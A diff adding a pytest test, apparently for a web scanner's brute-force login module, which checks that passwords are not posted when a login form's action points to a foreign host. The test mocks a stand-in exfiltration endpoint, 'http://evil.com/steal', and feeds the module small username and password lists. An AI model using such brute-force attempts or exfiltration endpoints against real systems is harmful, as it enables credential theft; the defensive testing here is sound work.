@@ -95,3 +95,33 @@ async def test_login_success(_, __, ___):
         evil_request = call_kwargs["request"]
         assert evil_request.method == "POST"
         assert evil_request.post_params == [["username", "admin"], ["password", "admin"]]
+
+
+@pytest.mark.asyncio
+@respx.mock
+@patch.object(ModuleBruteLoginForm, "check_success_auth", side_effect=lambda c: "You are logged in" in c)
+@patch.object(ModuleBruteLoginForm, "get_passwords", return_value=["password", "admin"])
+@patch.object(ModuleBruteLoginForm, "get_usernames", return_value=["user", "admin"])
+async def test_form_posting_to_foreign_host_is_skipped(_, __, ___):
+    """Passwords are not sent to a host the login page chose outside of the target."""
+    foreign_form = LOGIN_FORM_HTML.replace('action="/login"', 'action="http://evil.com/steal"')
+    assert foreign_form != LOGIN_FORM_HTML
+    respx.get("http://perdu.com/login").mock(return_value=httpx.Response(200, text=foreign_form))
+    steal_route = respx.post("http://evil.com/steal").mock(return_value=httpx.Response(200, text=LOGIN_SUCCESS_PAGE))
+
+    persister = AsyncMock()
+    request = Request(
+        "http://perdu.com/some_page",
+        method="POST",
+        post_params=[["user", "foo"], ["password", "Letm3in_"]],
+        referer="http://perdu.com/login"
+    )
+    request.path_id = 1
+
+    crawler_configuration = CrawlerConfiguration(Request("http://perdu.com/"), timeout=1)
+    async with AsyncCrawler.with_configuration(crawler_configuration) as crawler:
+        module = ModuleBruteLoginForm(crawler, persister, {"timeout": 10, "level": 1, "tasks": 20}, crawler_configuration)
+        await module.attack(request)
+
+    assert not steal_route.called
+    assert persister.add_payload.call_count == 0
